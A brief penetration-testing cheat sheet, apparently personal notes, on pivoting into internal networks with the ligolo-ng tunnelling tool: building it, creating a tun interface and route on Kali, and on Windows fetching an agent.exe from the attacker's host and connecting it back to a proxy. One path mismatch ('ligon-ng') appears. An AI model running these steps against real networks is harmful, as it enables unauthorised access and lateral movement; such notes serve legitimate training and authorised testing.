- https://kentosec.com/2022/01/13/pivoting-through-internal-networks-with-sshuttle-and-ligolo-ng/

Download:

```bash
git clone https://github.com/nicocha30/ligolo-ng.git

cd /tmp/ligon-ng

sudo go build -o agent cmd/agent/main.go
sudo go build -o proxy cmd/proxy/main.go

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip

unzip ligolo-ng_agent_0.5.2_windows_amd64.zip
```

On Kali:

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add $SUBNET_TARGET/24 dev ligolo

sudo ./proxy -selfcert
```

On Windows:

```bash
iwr -uri http://$KALI_IP:9999/windows/ligolo-ng/agent.exe -Outfile agent.exe

./agent.exe -connect 192.168.45.242:11601 -ignore-cert
```